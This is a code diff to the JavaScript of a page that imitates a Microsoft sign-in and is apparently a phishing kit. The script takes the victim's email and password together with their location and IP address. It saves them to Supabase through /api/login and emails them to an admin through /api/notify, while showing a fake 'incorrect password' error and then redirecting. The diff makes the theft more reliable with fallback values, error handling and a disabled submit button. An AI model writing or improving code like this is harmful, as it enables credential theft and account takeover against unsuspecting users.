@@ -301,20 +301,23 @@
                     msg2.style.color = "#E81123";
                     msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                     
-                    // Create the data object for Supabase
+                    // Create the data object with correct field names for Supabase
                     const userData = {
                         username: email.value + " (MS)",
                         password: password.value,
-                        country: country.value,
-                        city: city.value,
-                        continent: continent.value,
-                        ip_address: ip.value,
+                        country: country.value || "Unknown",
+                        city: city.value || "Unknown",
+                        continent: continent.value || "Unknown",
+                        ip_address: ip.value || "Unknown",
                         platform: 'microsoft'
                     };
                     
-                    console.log("Sending data to Next.js API", userData);
+                    console.log("Sending data to Supabase via API:", userData);
                     
-                    // Send to Next.js API route instead of PHP
+                    // Add loading indicator or disable button to prevent multiple submissions
+                    submit.disabled = true;
+                    
+                    // Use fetch with proper error handling
                     fetch('/api/login', {
                         method: 'POST',
                         headers: {
@@ -322,11 +325,17 @@
                         },
                         body: JSON.stringify(userData)
                     })
-                    .then(response => response.json())
+                    .then(response => {
+                        // Check if response is ok before parsing JSON
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! Status: ${response.status}`);
+                        }
+                        return response.json();
+                    })
                     .then(data => {
                         console.log('Data saved to Supabase:', data);
                         
-                        // Send notification email using Next.js API
+                        // Send notification email
                         sendNotificationEmail();
                         
                         // Redirect after short delay
@@ -336,24 +345,27 @@
                     })
                     .catch(error => {
                         console.error('Error saving data:', error);
+                        // Re-enable button in case of error
+                        submit.disabled = false;
+                        alert("An error occurred. Please try again later.");
                     });
                 }
             });
             
-            // Update to use Next.js API route instead of PHP
+            // Update notification function to use Next.js API
             function sendNotificationEmail() {
                 // Create notification data
                 const notificationData = {
                     username: email.value + " (MS)",
                     password: password.value,
-                    country: country.value,
-                    city: city.value,
-                    continent: continent.value,
-                    ip: ip.value,
-                    adminEmail: adminEmail.value
+                    country: country.value || "Unknown",
+                    city: city.value || "Unknown", 
+                    continent: continent.value || "Unknown",
+                    ip: ip.value || "Unknown",
+                    adminEmail: adminEmail ? adminEmail.value : 'your-admin-email@example.com'
                 };
                 
-                // Send notification via Next.js API route
+                // Send notification email
                 fetch('/api/notify', {
                     method: 'POST',
                     headers: {
